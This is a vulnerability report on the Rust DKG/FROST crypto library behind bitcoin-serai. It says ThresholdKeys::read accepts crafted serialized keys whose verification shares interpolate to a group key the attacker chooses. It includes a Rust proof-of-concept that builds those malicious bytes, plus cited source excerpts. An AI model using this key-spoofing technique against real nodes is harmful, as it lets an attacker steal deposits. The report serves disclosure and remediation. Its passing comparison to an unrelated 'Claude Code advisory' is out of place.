### Title
Unvalidated serialized `ThresholdKeys` lets attacker spoof the group key / trust root — funds reported received are controlled by the attacker - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` deserializes attacker-controlled bytes (`t`, `n`, `i`, interpolation, `secret_share`, and the full `verification_shares` map) and passes them to `ThresholdKeys::new`, which derives the group key solely as the interpolation of `verification_shares[1..=t]` — without ever checking that `secret_share` is consistent with `verification_shares[i]` or with the claimed group key. Like the `commondir` file in the Claude Code advisory, the embedded verification shares act as an unvalidated pointer that silently decides which identity (group key) the victim trusts and operates under. [1](#0-0) [2](#0-1) 

### Finding Description
`ThresholdKeys::new` performs only structural checks: share count equals `n`, participant indices are ≤ `n`, and `Constant` interpolation requires `t == n`. It then computes `group_key = Σ verification_shares[i] * λ_i` for `i ∈ 1..=t` and stores everything without verifying `C::generator() * secret_share == verification_shares[i]`, or that any verification share was honestly derived. [3](#0-2) 

An attacker who feeds crafted bytes to `ThresholdKeys::read` (listed as an in-scope untrusted input) can therefore construct keys where:

- `secret_share = r` and `verification_shares[i] = G·r` (so the victim's own share is fully self-consistent and passes per-share verification), while
- `verification_shares[1..=t]` interpolate to an attacker-chosen group key `G·a` (e.g. `t = 1`, `i > t`, `verification_shares[1] = G·a` where the attacker knows `a`).

The codebase itself acknowledges deserialized keys can be semantically invalid: `complete()` in FROST contains an `InternalError` branch for "everyone had a valid share yet the signature was still invalid… caused by deserializing a semantically invalid FrostKeys". [4](#0-3)  The same gap exists implicitly elsewhere — `musig()` only `debug_assert`s `our_pub_key == verification_shares[i]` [5](#0-4)  and `dealer` only `debug_assert`s the group key [6](#0-5) , so release builds never verify the invariant.

### Impact Explanation
In bitcoin-serai, the `Scanner` matches received outputs by `script_pubkey`, which is derived from the key's group key. A victim node loaded with spoofed `ThresholdKeys` will report outputs paying to the attacker's group key `G·a` as received funds, while its secret share `r` cannot ever produce a valid signature for that key — every signing attempt produces individually-valid shares that fail final signature verification (the `InternalError` path). The result is funds reported received that are not spendable by the victim but are fully spendable by the attacker who knows `a` — direct theft of deposits, plus mis-blame of honest co-signers via `FrostError::InvalidShare`. [7](#0-6) 

### Likelihood Explanation
Exploitation requires the attacker to supply the serialized key bytes (backup import, coordinator-supplied or message-queue-delivered key material). No collusion or privileged position is needed — only a single write of untrusted bytes into `ThresholdKeys::read`. Once loaded, every subsequent scan/sign operation is silently subverted; the inconsistency is never detected because validation is absent in release builds. Medium–High likelihood depending on the key-provisioning path; High impact (fund theft), so overall High.

### Recommendation
In `ThresholdKeys::new` (which `read` funnels through), enforce consistency: return an error unless `C::generator() * secret_share == verification_shares[&params.i()]`, and document that `group_key` is derived, not trusted. This single check rejects spoofed verification-share maps, since a consistent secret share forces the group key to be the honest interpolation. Additionally, replace the `debug_assert`s in `musig()`/`dealer`/`promote` paths with real checks, and reject `i > t` keys whose own share can never contribute to the group key unless explicitly intended.

### Proof of Concept
```rust
// Attacker crafts serialized ThresholdKeys for a victim whose real
// group key/address the attacker wants to impersonate.
let a = <C as Ciphersuite>::F::random(&mut rng);      // attacker's scalar
let r = <C as Ciphersuite>::F::random(&mut rng);      // victim's loaded share

let mut buf = vec![];
// curve ID header (as expected by read)
buf.extend((C::ID.len() as u32).to_le_bytes());
buf.extend(C::ID);
// t = 1, n = 2, i = 2  (victim's index does NOT participate in group_key)
buf.extend(1u16.to_le_bytes());   // t
buf.extend(2u16.to_le_bytes());   // n
buf.extend(2u16.to_le_bytes());   // i
buf.push(1);                      // Interpolation::Lagrange
buf.extend(r.to_repr().as_ref()); // secret_share = r
buf.extend((C::generator() * a).to_bytes().as_ref()); // vs[1] = attacker key -> group_key = G*a
buf.extend((C::generator() * r).to_bytes().as_ref()); // vs[2] = G*r (self-consistent)

let keys = ThresholdKeys::<C>::read(&mut buf.as_ref()).unwrap();
assert_eq!(keys.group_key(), C::generator() * a); // attacker-controlled key
// bitcoin-serai Scanner now reports payments to address(G*a) as "received";
// victim signs with r: shares pass verify_share against vs[2], but the
// aggregate signature never verifies under group_key G*a -> funds unspendable
// for the victim, spendable by the attacker (owner of a).
```

### Citations

**File:** crypto/dkg/src/lib.rs (L355-391)
```rust
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
  }
```

**File:** crypto/dkg/src/lib.rs (L574-632)
```rust
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
  }
```

**File:** crypto/dkg/musig/src/lib.rs (L151-153)
```rust
  let group_key = multiexp::multiexp(&multiexp);
  debug_assert_eq!(our_pub_key, verification_shares[&params.i()]);
  debug_assert_eq!(musig_key_vartime::<C>(context, keys), Ok(group_key));
```

**File:** crypto/dkg/dealer/src/lib.rs (L58-65)
```rust
    let keys = ThresholdKeys::new(
      ThresholdParams::new(threshold, participants, i)?,
      Interpolation::Lagrange,
      secret_share,
      verification_shares.clone(),
    )?;
    debug_assert_eq!(keys.group_key(), group_key);
    res.insert(i, keys);
```

**File:** crypto/frost/src/sign.rs (L474-494)
```rust
    let mut batch = BatchVerifier::new(self.view.included().len());
    for l in self.view.included() {
      if let Ok(statements) = self.params.algorithm.verify_share(
        self.view.verification_share(*l),
        &self.B.bound(*l),
        responses[l],
      ) {
        batch.queue(&mut rng, *l, statements);
      } else {
        Err(FrostError::InvalidShare(*l))?;
      }
    }

    if let Err(l) = batch.verify_vartime_with_vartime_blame() {
      Err(FrostError::InvalidShare(l))?;
    }

    // If everyone has a valid share, and there were enough participants, this should've worked
    // The only known way to cause this, for valid parameters/algorithms, is to deserialize a
    // semantically invalid FrostKeys
    Err(FrostError::InternalError("everyone had a valid share yet the signature was still invalid"))
```
